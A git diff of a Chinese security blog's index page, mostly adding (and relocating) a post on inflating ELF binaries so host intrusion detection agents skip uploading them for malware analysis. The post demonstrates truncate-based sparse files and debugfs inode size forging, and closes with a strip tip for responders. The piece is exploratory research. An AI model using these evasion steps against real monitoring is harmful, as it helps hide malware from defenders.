+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
 
     
 
@@ -285,6 +708,159 @@
 <li>“暂停进程”需要考虑到”父进程恢复进程状态”的场景</li>
 </ul>
 <p>本文提到的手段没有在真实的对抗中实践过，仅仅是我自己的研究，欢迎与我交流。</p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021-12-26-%E5%A6%82%E4%BD%95%E9%81%BF%E5%85%8D%E6%96%87%E4%BB%B6%E4%B8%8A%E6%8A%A5-%E5%88%B6%E4%BD%9C%E5%A4%A7%E6%96%87%E4%BB%B6/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="leveryd">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="leveryd的个人博客">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2021-12-26-%E5%A6%82%E4%BD%95%E9%81%BF%E5%85%8D%E6%96%87%E4%BB%B6%E4%B8%8A%E6%8A%A5-%E5%88%B6%E4%BD%9C%E5%A4%A7%E6%96%87%E4%BB%B6/" class="post-title-link" itemprop="url">如何避免文件上报-制作大文件</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2021-12-26 15:33:56" itemprop="dateCreated datePublished" datetime="2021-12-26T15:33:56+08:00">2021-12-26</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>了解hids的读者应该知道hids agent会有上报很多信息，其中有的agent会将可疑文件上报到云端做恶意分析。</p>
+<p>同事问我一个问题：文件如果特别大，也会被上报吗？不会影响性能吗？</p>
+<p>这个问题让我联想到 <a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/qAv2wspeuCfhCjTaz03hNg">你的扫描器可以绕过防火墙么（三）</a> 中大包绕过waf的场景，接着很容易想到：如果agent碰到大文件就不上传了，不就很容易绕过云端的恶意分析了嘛。</p>
+<p>另外，一个恶意文件如果体积过大，可能对安全研究人员做”样本分析”造成一些困难，比如无法将文件下载到本地电脑（网速、磁盘空间可能不够）、ida等静态分析软件内存占用过大。</p>
+<p>基于以上”安全攻防”的业务场景，加上我最近在学习一些操作系统相关的知识，所以就研究下”怎么让elf文件变大”。</p>
+<p>文件变大的同时，还要满足以下条件：</p>
+<ul>
+<li>不影响elf文件执行</li>
+<li>从实用角度来说，攻击队也不会生成一个大文件，然后上传到目标。最好是上传一个小文件，上传到目标机器，然后本地让文件变大。</li>
+</ul>
+<p>先说结论，有以下方式让”文件大小”变大：</p>
+<ul>
+<li>文件末尾追加数据</li>
+<li>稀疏文件</li>
+<li>修改inode元数据</li>
+<li>向elf文件节中填充垃圾数据</li>
+</ul>
+<p>说明一下测试环境：测试程序是id命令，复制到了/tmp/y目录下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@instance-fj5pftdp y]# \cp &#x2F;usr&#x2F;bin&#x2F;id &#x2F;tmp&#x2F;y</span><br></pre></td></tr></table></figure>
+
+<h1 id="文件末尾追加数据"><a href="#文件末尾追加数据" class="headerlink" title="文件末尾追加数据"></a>文件末尾追加数据</h1><ul>
+<li><p>怎么实现？</p>
+<p>这种方式实现很简单，如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[root@instance-fj5pftdp y]# echo 1111 &gt;&gt; .&#x2F;id</span><br><span class="line">[root@instance-fj5pftdp y]# .&#x2F;id</span><br><span class="line">uid&#x3D;0(root) gid&#x3D;0(root) 组&#x3D;0(root)</span><br></pre></td></tr></table></figure>
+<p>关键是这样修改后的文件，还能正常执行。</p>
+</li>
+</ul>
+<h1 id="稀疏文件"><a href="#稀疏文件" class="headerlink" title="稀疏文件"></a>稀疏文件</h1><ul>
+<li><p>“稀疏文件”是什么？</p>
+<p>“稀疏文件”的”文件大小”和实际占用磁盘空间是不一致的，比如:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[root@instance-fj5pftdp y]# ll -h id</span><br><span class="line">-rwxr-xr-x 1 root root 10T 9月   6 20:03 id</span><br><span class="line">[root@instance-fj5pftdp y]# du -sh id</span><br><span class="line">40K	id</span><br></pre></td></tr></table></figure>
+<p>从上面命令可以看到：”文件大小”是10T，但实际数据只占用40K的磁盘大小。</p>
+<p>对于原理感兴趣的读者，可以参考 <a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/bLiqURdK_dtgr0GqU7yD9w">深度剖析 Linux cp 的秘密</a> 这篇文章。</p>
+</li>
+<li><p>怎么修改成”稀疏文件”？</p>
+<p>可以利用fallocate、truncate命令。</p>
+<p>使用起来也很简单，以truncate举例：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[root@instance-fj5pftdp y]# ls -alh id</span><br><span class="line">-rwxr-xr-x 1 root root 37K 9月   5 20:18 id</span><br><span class="line">[root@instance-fj5pftdp y]# time truncate -s 10T id   &#x2F;&#x2F; 将id程序稀疏成10T大小</span><br><span class="line"></span><br><span class="line">real	0m0.007s</span><br><span class="line">user	0m0.000s</span><br><span class="line">sys	0m0.007s</span><br><span class="line">[root@instance-fj5pftdp y]# ls -alh id</span><br><span class="line">-rwxr-xr-x 1 root root 10T 9月   5 20:02 id    &#x2F;&#x2F; 文件大小已经变成10T</span><br><span class="line">[root@instance-fj5pftdp y]# .&#x2F;id</span><br><span class="line">uid&#x3D;0(root) gid&#x3D;0(root) 组&#x3D;0(root)</span><br></pre></td></tr></table></figure>
+
+<p>这种方式修改文件有两个特点：</p>
+<blockquote>
+<p>文件改动非常快，上面的例子中将id文件大小扩大到”10T”只用了1s不到</p>
+<p>文件大小最大可以是10T以上，但不需要本地磁盘空间真的有10T</p>
+</blockquote>
+<p>当你想下载或者读这个文件(比如<code>cat</code>)时，却是会有实实在在的<code>10T</code>流量。10T流量，按照”10M/s”的速度下载，也需要下载291个小时。</p>
+</li>
+</ul>
+<h1 id="修改inode元数据"><a href="#修改inode元数据" class="headerlink" title="修改inode元数据"></a>修改inode元数据</h1><ul>
+<li><p>为什么修改”inode元数据”就可以修改文件大小信息？</p>
+<p>inode元数据包含了文件大小信息，而inode元数据也是存储在磁盘扇区中的，所以应该可以通过修改inode元数据来”伪造”文件大小。</p>
+<p>其实不光大小信息，inode元数据中还包括 文件是否删除、创建时间、修改时间、访问时间 等信息，所以这些都可以被伪造。</p>
+<p>可以通过stat命令查看inode元数据：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[root@instance-fj5pftdp y]# stat id</span><br><span class="line">  文件：&quot;id&quot;</span><br><span class="line">  大小：37400     	块：80         IO 块：4096   普通文件</span><br><span class="line">设备：fd01h&#x2F;64769d	Inode：171252      硬链接：1</span><br><span class="line">权限：(0755&#x2F;-rwxr-xr-x)  Uid：(    0&#x2F;    root)   Gid：(    0&#x2F;    root)</span><br><span class="line">最近访问：2021-09-06 20:27:26.224913458 +0800</span><br><span class="line">最近更改：2021-09-06 20:27:26.218913032 +0800</span><br><span class="line">最近改动：2021-09-06 20:27:26.224913458 +0800</span><br><span class="line">创建时间：-</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>怎么修改”inode元数据”？</p>
+<p>利用debugfs命令，如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">[root@instance-fj5pftdp ~]# debugfs -w &#x2F;dev&#x2F;vda1</span><br><span class="line">debugfs:  mi &#x2F;tmp&#x2F;y&#x2F;id</span><br><span class="line">                          Mode    [0100755]</span><br><span class="line">                       User ID    [0]</span><br><span class="line">                      Group ID    [0]</span><br><span class="line">                          Size    [37400] 100000      &#x2F;&#x2F; 这里修改文件大小为100000</span><br><span class="line">                 Creation time    [1630929039]</span><br><span class="line">             ...</span><br><span class="line">debugfs:  quit</span><br><span class="line">[root@instance-fj5pftdp ~]# ll &#x2F;tmp&#x2F;y&#x2F;id</span><br><span class="line">-rwxr-xr-x 1 root root 37400 9月   6 19:50 &#x2F;tmp&#x2F;y&#x2F;id</span><br><span class="line">[root@instance-fj5pftdp ~]# echo 3 &gt; &#x2F;proc&#x2F;sys&#x2F;vm&#x2F;drop_caches   &#x2F;&#x2F; 清理inode缓存后，修改才生效</span><br><span class="line">[root@instance-fj5pftdp ~]# ll &#x2F;tmp&#x2F;y&#x2F;id</span><br><span class="line">-rwxr-xr-x 1 root root 100000 9月   6 19:50 &#x2F;tmp&#x2F;y&#x2F;id    &#x2F;&#x2F; 文件大小变成了100000</span><br><span class="line">[root@instance-fj5pftdp ~]# &#x2F;tmp&#x2F;y&#x2F;id</span><br><span class="line">uid&#x3D;0(root) gid&#x3D;0(root) 组&#x3D;0(root)</span><br></pre></td></tr></table></figure>
+
+<p>在测试过程中，需要读者注意的是：</p>
+<blockquote>
+<p>因为会对磁盘数据做写操作，所以最好找一个没数据的机器做测试</p>
+<p>记得清理inode缓存</p>
+<p>测试时如果使用文件当作设备，在挂载文件系统时去修改文件大小 会不生效。原因未知</p>
+</blockquote>
+</li>
+</ul>
+<h1 id="向elf文件节中添加垃圾数据"><a href="#向elf文件节中添加垃圾数据" class="headerlink" title="向elf文件节中添加垃圾数据"></a>向elf文件节中添加垃圾数据</h1><ul>
+<li><p>是什么？</p>
+<p>elf文件中包含很多的<em>节</em>，比如：</p>
+<blockquote>
+<p>.text存放代码</p>
+<p>.data存放初始化的全局变量和静态变量</p>
+</blockquote>
+<p>关于elf的文件格式，更多信息可以参考 《程序员的自我修养—链接、装载与库》第三章 elf文件结构描述。</p>
+<p>可以向elf的节（比如.data、.text、.bss等）中写入垃圾数据，而不影响程序的正常运行。</p>
+</li>
+</ul>
+<p>  这种方式和其他三种方式的区别在于：因为可以删掉没用的节，所以就很容易就把”其他三种方式”修改的elf给还原回来。</p>
+<p>  比如strip后，文件大小就还原了<br>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[root@instance-fj5pftdp y]# ll -h id</span><br><span class="line">-rwxr-xr-x 1 root root 10T 9月   6 20:03 id</span><br><span class="line">[root@instance-fj5pftdp y]# strip id</span><br><span class="line">[root@instance-fj5pftdp y]# ll -h id</span><br><span class="line">-rwxr-xr-x 1 root root 37K 9月   6 20:27 id</span><br></pre></td></tr></table></figure></p>
+<ul>
+<li><p>怎么”向elf文件节中添加垃圾数据”？</p>
+<p>没有找到linux自带的命令，找到 <a target="_blank" rel="noopener" href="https://firmianay.gitbook.io/ctf-all-in-one/3_topics/reverse/3.2.1_patch_binary#patchkit">patch elf工具-patchkit</a>。</p>
+<p>看文档感觉有点麻烦，就没有做测试了。</p>
+</li>
+</ul>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>“文件末尾追加数据”和”向elf文件节中填充垃圾数据”这两种方式是真的修改了文件内容，所以受限于磁盘空间大小也不可能生成几个T大小的文件。</p>
+<p>“稀疏文件”这种方式，可以方便快速地生成几个T大小的文件，并且让上传、下载此文件 耗费很多时间，甚至是不可能成功。</p>
+<p>“修改inode元数据”，虽然也可以快速地将文件大小修改为几个T，但是并不会让上传、下载此文件 耗费很多时间，传输的文件大小还是实际大小。</p>
+<p>如果应急时碰到超大的elf文件，就先用strip看看体积会不会变小。</p>
+<p>本文提到的手段没有在真实的对抗中实践过，仅仅是我自己的研究，欢迎有对抗经验的读者与我交流。</p>
 
       
     </div>
@@ -725,159 +1301,6 @@
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021-12-26-%E5%A6%82%E4%BD%95%E9%81%BF%E5%85%8D%E6%96%87%E4%BB%B6%E4%B8%8A%E6%8A%A5-%E5%88%B6%E4%BD%9C%E5%A4%A7%E6%96%87%E4%BB%B6/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="leveryd">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="leveryd的个人博客">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2021-12-26-%E5%A6%82%E4%BD%95%E9%81%BF%E5%85%8D%E6%96%87%E4%BB%B6%E4%B8%8A%E6%8A%A5-%E5%88%B6%E4%BD%9C%E5%A4%A7%E6%96%87%E4%BB%B6/" class="post-title-link" itemprop="url">如何避免文件上报-制作大文件</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-
-      <time title="创建时间：2021-12-26 15:33:56" itemprop="dateCreated datePublished" datetime="2021-12-26T15:33:56+08:00">2021-12-26</time>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>了解hids的读者应该知道hids agent会有上报很多信息，其中有的agent会将可疑文件上报到云端做恶意分析。</p>
-<p>同事问我一个问题：文件如果特别大，也会被上报吗？不会影响性能吗？</p>
-<p>这个问题让我联想到 <a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/qAv2wspeuCfhCjTaz03hNg">你的扫描器可以绕过防火墙么（三）</a> 中大包绕过waf的场景，接着很容易想到：如果agent碰到大文件就不上传了，不就很容易绕过云端的恶意分析了嘛。</p>
-<p>另外，一个恶意文件如果体积过大，可能对安全研究人员做”样本分析”造成一些困难，比如无法将文件下载到本地电脑（网速、磁盘空间可能不够）、ida等静态分析软件内存占用过大。</p>
-<p>基于以上”安全攻防”的业务场景，加上我最近在学习一些操作系统相关的知识，所以就研究下”怎么让elf文件变大”。</p>
-<p>文件变大的同时，还要满足以下条件：</p>
-<ul>
-<li>不影响elf文件执行</li>
-<li>从实用角度来说，攻击队也不会生成一个大文件，然后上传到目标。最好是上传一个小文件，上传到目标机器，然后本地让文件变大。</li>
-</ul>
-<p>先说结论，有以下方式让”文件大小”变大：</p>
-<ul>
-<li>文件末尾追加数据</li>
-<li>稀疏文件</li>
-<li>修改inode元数据</li>
-<li>向elf文件节中填充垃圾数据</li>
-</ul>
-<p>说明一下测试环境：测试程序是id命令，复制到了/tmp/y目录下</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@instance-fj5pftdp y]# \cp &#x2F;usr&#x2F;bin&#x2F;id &#x2F;tmp&#x2F;y</span><br></pre></td></tr></table></figure>
-
-<h1 id="文件末尾追加数据"><a href="#文件末尾追加数据" class="headerlink" title="文件末尾追加数据"></a>文件末尾追加数据</h1><ul>
-<li><p>怎么实现？</p>
-<p>这种方式实现很简单，如下</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[root@instance-fj5pftdp y]# echo 1111 &gt;&gt; .&#x2F;id</span><br><span class="line">[root@instance-fj5pftdp y]# .&#x2F;id</span><br><span class="line">uid&#x3D;0(root) gid&#x3D;0(root) 组&#x3D;0(root)</span><br></pre></td></tr></table></figure>
-<p>关键是这样修改后的文件，还能正常执行。</p>
-</li>
-</ul>
-<h1 id="稀疏文件"><a href="#稀疏文件" class="headerlink" title="稀疏文件"></a>稀疏文件</h1><ul>
-<li><p>“稀疏文件”是什么？</p>
-<p>“稀疏文件”的”文件大小”和实际占用磁盘空间是不一致的，比如:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[root@instance-fj5pftdp y]# ll -h id</span><br><span class="line">-rwxr-xr-x 1 root root 10T 9月   6 20:03 id</span><br><span class="line">[root@instance-fj5pftdp y]# du -sh id</span><br><span class="line">40K	id</span><br></pre></td></tr></table></figure>
-<p>从上面命令可以看到：”文件大小”是10T，但实际数据只占用40K的磁盘大小。</p>
-<p>对于原理感兴趣的读者，可以参考 <a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/bLiqURdK_dtgr0GqU7yD9w">深度剖析 Linux cp 的秘密</a> 这篇文章。</p>
-</li>
-<li><p>怎么修改成”稀疏文件”？</p>
-<p>可以利用fallocate、truncate命令。</p>
-<p>使用起来也很简单，以truncate举例：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[root@instance-fj5pftdp y]# ls -alh id</span><br><span class="line">-rwxr-xr-x 1 root root 37K 9月   5 20:18 id</span><br><span class="line">[root@instance-fj5pftdp y]# time truncate -s 10T id   &#x2F;&#x2F; 将id程序稀疏成10T大小</span><br><span class="line"></span><br><span class="line">real	0m0.007s</span><br><span class="line">user	0m0.000s</span><br><span class="line">sys	0m0.007s</span><br><span class="line">[root@instance-fj5pftdp y]# ls -alh id</span><br><span class="line">-rwxr-xr-x 1 root root 10T 9月   5 20:02 id    &#x2F;&#x2F; 文件大小已经变成10T</span><br><span class="line">[root@instance-fj5pftdp y]# .&#x2F;id</span><br><span class="line">uid&#x3D;0(root) gid&#x3D;0(root) 组&#x3D;0(root)</span><br></pre></td></tr></table></figure>
-
-<p>这种方式修改文件有两个特点：</p>
-<blockquote>
-<p>文件改动非常快，上面的例子中将id文件大小扩大到”10T”只用了1s不到</p>
-<p>文件大小最大可以是10T以上，但不需要本地磁盘空间真的有10T</p>
-</blockquote>
-<p>当你想下载或者读这个文件(比如<code>cat</code>)时，却是会有实实在在的<code>10T</code>流量。10T流量，按照”10M/s”的速度下载，也需要下载291个小时。</p>
-</li>
-</ul>
-<h1 id="修改inode元数据"><a href="#修改inode元数据" class="headerlink" title="修改inode元数据"></a>修改inode元数据</h1><ul>
-<li><p>为什么修改”inode元数据”就可以修改文件大小信息？</p>
-<p>inode元数据包含了文件大小信息，而inode元数据也是存储在磁盘扇区中的，所以应该可以通过修改inode元数据来”伪造”文件大小。</p>
-<p>其实不光大小信息，inode元数据中还包括 文件是否删除、创建时间、修改时间、访问时间 等信息，所以这些都可以被伪造。</p>
-<p>可以通过stat命令查看inode元数据：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[root@instance-fj5pftdp y]# stat id</span><br><span class="line">  文件：&quot;id&quot;</span><br><span class="line">  大小：37400     	块：80         IO 块：4096   普通文件</span><br><span class="line">设备：fd01h&#x2F;64769d	Inode：171252      硬链接：1</span><br><span class="line">权限：(0755&#x2F;-rwxr-xr-x)  Uid：(    0&#x2F;    root)   Gid：(    0&#x2F;    root)</span><br><span class="line">最近访问：2021-09-06 20:27:26.224913458 +0800</span><br><span class="line">最近更改：2021-09-06 20:27:26.218913032 +0800</span><br><span class="line">最近改动：2021-09-06 20:27:26.224913458 +0800</span><br><span class="line">创建时间：-</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>怎么修改”inode元数据”？</p>
-<p>利用debugfs命令，如下：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">[root@instance-fj5pftdp ~]# debugfs -w &#x2F;dev&#x2F;vda1</span><br><span class="line">debugfs:  mi &#x2F;tmp&#x2F;y&#x2F;id</span><br><span class="line">                          Mode    [0100755]</span><br><span class="line">                       User ID    [0]</span><br><span class="line">                      Group ID    [0]</span><br><span class="line">                          Size    [37400] 100000      &#x2F;&#x2F; 这里修改文件大小为100000</span><br><span class="line">                 Creation time    [1630929039]</span><br><span class="line">             ...</span><br><span class="line">debugfs:  quit</span><br><span class="line">[root@instance-fj5pftdp ~]# ll &#x2F;tmp&#x2F;y&#x2F;id</span><br><span class="line">-rwxr-xr-x 1 root root 37400 9月   6 19:50 &#x2F;tmp&#x2F;y&#x2F;id</span><br><span class="line">[root@instance-fj5pftdp ~]# echo 3 &gt; &#x2F;proc&#x2F;sys&#x2F;vm&#x2F;drop_caches   &#x2F;&#x2F; 清理inode缓存后，修改才生效</span><br><span class="line">[root@instance-fj5pftdp ~]# ll &#x2F;tmp&#x2F;y&#x2F;id</span><br><span class="line">-rwxr-xr-x 1 root root 100000 9月   6 19:50 &#x2F;tmp&#x2F;y&#x2F;id    &#x2F;&#x2F; 文件大小变成了100000</span><br><span class="line">[root@instance-fj5pftdp ~]# &#x2F;tmp&#x2F;y&#x2F;id</span><br><span class="line">uid&#x3D;0(root) gid&#x3D;0(root) 组&#x3D;0(root)</span><br></pre></td></tr></table></figure>
-
-<p>在测试过程中，需要读者注意的是：</p>
-<blockquote>
-<p>因为会对磁盘数据做写操作，所以最好找一个没数据的机器做测试</p>
-<p>记得清理inode缓存</p>
-<p>测试时如果使用文件当作设备，在挂载文件系统时去修改文件大小 会不生效。原因未知</p>
-</blockquote>
-</li>
-</ul>
-<h1 id="向elf文件节中添加垃圾数据"><a href="#向elf文件节中添加垃圾数据" class="headerlink" title="向elf文件节中添加垃圾数据"></a>向elf文件节中添加垃圾数据</h1><ul>
-<li><p>是什么？</p>
-<p>elf文件中包含很多的<em>节</em>，比如：</p>
-<blockquote>
-<p>.text存放代码</p>
-<p>.data存放初始化的全局变量和静态变量</p>
-</blockquote>
-<p>关于elf的文件格式，更多信息可以参考 《程序员的自我修养—链接、装载与库》第三章 elf文件结构描述。</p>
-<p>可以向elf的节（比如.data、.text、.bss等）中写入垃圾数据，而不影响程序的正常运行。</p>
-</li>
-</ul>
-<p>  这种方式和其他三种方式的区别在于：因为可以删掉没用的节，所以就很容易就把”其他三种方式”修改的elf给还原回来。</p>
-<p>  比如strip后，文件大小就还原了<br>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[root@instance-fj5pftdp y]# ll -h id</span><br><span class="line">-rwxr-xr-x 1 root root 10T 9月   6 20:03 id</span><br><span class="line">[root@instance-fj5pftdp y]# strip id</span><br><span class="line">[root@instance-fj5pftdp y]# ll -h id</span><br><span class="line">-rwxr-xr-x 1 root root 37K 9月   6 20:27 id</span><br></pre></td></tr></table></figure></p>
-<ul>
-<li><p>怎么”向elf文件节中添加垃圾数据”？</p>
-<p>没有找到linux自带的命令，找到 <a target="_blank" rel="noopener" href="https://firmianay.gitbook.io/ctf-all-in-one/3_topics/reverse/3.2.1_patch_binary#patchkit">patch elf工具-patchkit</a>。</p>
-<p>看文档感觉有点麻烦，就没有做测试了。</p>
-</li>
-</ul>
-<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>“文件末尾追加数据”和”向elf文件节中填充垃圾数据”这两种方式是真的修改了文件内容，所以受限于磁盘空间大小也不可能生成几个T大小的文件。</p>
-<p>“稀疏文件”这种方式，可以方便快速地生成几个T大小的文件，并且让上传、下载此文件 耗费很多时间，甚至是不可能成功。</p>
-<p>“修改inode元数据”，虽然也可以快速地将文件大小修改为几个T，但是并不会让上传、下载此文件 耗费很多时间，传输的文件大小还是实际大小。</p>
-<p>如果应急时碰到超大的elf文件，就先用strip看看体积会不会变小。</p>
-<p>本文提到的手段没有在真实的对抗中实践过，仅仅是我自己的研究，欢迎有对抗经验的读者与我交流。</p>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021-12-26-%E5%85%A8%E6%B5%81%E9%87%8F%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B%E7%B3%BB%E7%BB%9F%E7%9A%84%E6%80%A7%E8%83%BD%E5%88%86%E6%9E%90/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1003,478 +1426,8 @@
 
 
 
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021-12-26-%E5%80%9F%E5%8A%A9crash%E5%B7%A5%E5%85%B7%E7%90%86%E8%A7%A3linux%E7%B3%BB%E7%BB%9F%E7%9A%84%E5%86%85%E5%AD%98%E5%88%86%E9%85%8D/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="leveryd">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="leveryd的个人博客">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2021-12-26-%E5%80%9F%E5%8A%A9crash%E5%B7%A5%E5%85%B7%E7%90%86%E8%A7%A3linux%E7%B3%BB%E7%BB%9F%E7%9A%84%E5%86%85%E5%AD%98%E5%88%86%E9%85%8D/" class="post-title-link" itemprop="url">借助crash工具理解linux系统的内存分配</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-
-      <time title="创建时间：2021-12-26 15:33:56" itemprop="dateCreated datePublished" datetime="2021-12-26T15:33:56+08:00">2021-12-26</time>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/qxbp6PGpCqzFDSToIWn05Q">Linux下访问匿名页发生的神奇“化学反应”</a>，我看完这篇文章感觉对linux的内存分配又多了一点点理解，因此也想推荐给你读下。</p>
-<p>原文提出了一个问题：向<code>mmap</code>系统调用申请的内存”读时”没有导致物理可用内存减少，但是”随后写时”发现物理可用内存减少。</p>
-<p>原作者借助”分析内核源码”的收到来剖析问题原因，最终得到结论：第一次读匿名页后，然后写匿名页，先只读方式映射到0页，然后发生写时复制，分配物理页，虚拟页以可读可写的方式映射到此物理页。</p>
-<p>我自己总结一下，就是按照时间顺序来看，当对”可读可写的vma”先读后写时，”对应的页表项”应该是：</p>
-<ul>
-<li>在第一次读之前不存在</li>
-<li>在第一次读之后，第一次写之前，映射到固定位置，此时页表属性是只读</li>
-<li>在第一次写之后，映射到实际分配的物理内存，此时页表属性是可读可写</li>
-</ul>
-<p>可能这个结论你听着还是有点绕，并且我想你可能和我一样，也不想一下子就去研究”内核源码”来理解到底是怎么回事。</p>
